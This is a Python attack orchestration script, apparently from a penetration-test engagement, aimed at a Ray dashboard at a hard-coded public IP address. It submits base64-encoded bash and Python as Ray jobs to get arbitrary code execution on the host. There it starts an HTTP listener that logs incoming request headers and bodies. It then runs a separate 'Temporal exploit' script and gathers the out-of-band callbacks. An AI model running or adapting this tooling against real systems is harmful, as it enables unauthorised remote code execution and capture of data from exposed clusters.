#!/usr/bin/env python3
"""Orchestrate: start HTTP listener on the in-scope Ray seat, run Temporal exploit, collect callbacks."""
import os, json, time, base64, uuid, subprocess, urllib.request, urllib.error

RAY = os.environ.get("RAY", "http://24.165.187.21:8265")
OUT = os.environ.get("OUT", "out"); os.makedirs(OUT, exist_ok=True)
TOK = uuid.uuid4().hex[:8]
CB = f"http://24.165.187.21:18080/cb-{TOK}"

def get(p, t=25):
    try:
        with urllib.request.urlopen(RAY + p, timeout=t) as r:
            return r.status, r.read().decode("utf8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf8", "replace")
    except Exception as e:
        return 0, str(e)

def post(p, data, t=40):
    req = urllib.request.Request(RAY + p, data=json.dumps(data).encode(),
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=t) as r:
            return r.status, r.read().decode("utf8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf8", "replace")
    except Exception as e:
        return 0, str(e)

LISTENER = r'''
import http.server, json
class H(http.server.BaseHTTPRequestHandler):
    def _h(self):
        n = int(self.headers.get('Content-Length') or 0)
        b = self.rfile.read(n) if n else b''
        rec = {'m': self.command, 'p': self.path, 'h': dict(self.headers), 'b': b.decode('utf-8','replace')[:8000]}
        print(json.dumps(rec), flush=True)
        self.send_response(200); self.send_header('Content-Length','2'); self.end_headers(); self.wfile.write(b'ok')
    do_GET = _h; do_POST = _h; do_PUT = _h
    def log_message(self, *a): pass
http.server.HTTPServer(('0.0.0.0', 18080), H).serve_forever()
'''

def submit(script, sid, timeout=180):
    b = base64.b64encode(script.encode()).decode()
    entry = f"bash -c 'echo {b} | base64 -d > /tmp/{sid}.py; python3 /tmp/{sid}.py'"
    st, body = post("/api/jobs/", {"entrypoint": entry, "runtime_env": {}, "submission_id": sid})
    print(f"[submit {sid}] {st} {body[:200]}")
    return st

def logs(sid):
    st, d = get(f"/api/jobs/{sid}/logs")
    try:
        return json.loads(d).get("logs") or ""
    except Exception:
        return d

def status(sid):
    st, d = get(f"/api/jobs/{sid}")
    try:
        return json.loads(d).get("status")
    except Exception:
        return None

def main():
    stop = os.environ.get("STOP_ID")
    if stop:
        try:
            req = urllib.request.Request(RAY + f"/api/jobs/{stop}", method="DELETE")
            urllib.request.urlopen(req, timeout=20); print("stopped", stop)
        except Exception as e:
            print("stop fail", e)
        return
    sid = "ul4035-cb-" + TOK
    result = {"callback": CB, "ray": RAY}
    st = submit(LISTENER, sid)
    result["listener_submit"] = st
    if st not in (200, 201):
        json.dump(result, open(os.path.join(OUT, "orchestrate.json"), "w"), indent=1)
        print("listener failed", st)
        # still try the exploit without callback
        env = dict(os.environ, CB="")
        subprocess.run(["python3", "scripts/ul4035_exploit.py"], env=env)
        return
    # verify listener is up from here
    time.sleep(8)
    try:
        r = urllib.request.urlopen(CB + "/selftest", timeout=10)
        result["selftest"] = r.status
    except Exception as e:
        result["selftest"] = str(e)[:120]
    if os.environ.get("CBCHECK") == "1":
        print("CBCHECK mode: listener only")
        time.sleep(20)
        lg0 = logs(sid)
        print("pre-hit count:", lg0.count('"m":'))
        open(os.path.join(OUT, "listener.log"), "w").write(lg0)
        result["listener_hits"] = lg0.count('"m":')
        try:
            req = urllib.request.Request(RAY + f"/api/jobs/{sid}", method="DELETE")
            urllib.request.urlopen(req, timeout=20); result["stopped"] = True
        except Exception as e:
            result["stopped"] = str(e)[:120]
        json.dump(result, open(os.path.join(OUT, "orchestrate.json"), "w"), indent=1)
        print(json.dumps(result))
        return
    env = dict(os.environ, CB=CB)
    subprocess.run(["python3", "scripts/ul4035_exploit.py"], env=env)
    time.sleep(45)
    lg = logs(sid)
    open(os.path.join(OUT, "listener.log"), "w").write(lg)
    result["listener_status"] = status(sid)
    result["listener_hits"] = lg.count('"m":')
    # stop the listener (DELETE)
    try:
        req = urllib.request.Request(RAY + f"/api/jobs/{sid}", method="DELETE")
        urllib.request.urlopen(req, timeout=20)
        result["stopped"] = True
    except Exception as e:
        result["stopped"] = str(e)[:120]
    json.dump(result, open(os.path.join(OUT, "orchestrate.json"), "w"), indent=1)
    print(json.dumps(result))

if __name__ == "__main__":
    main()
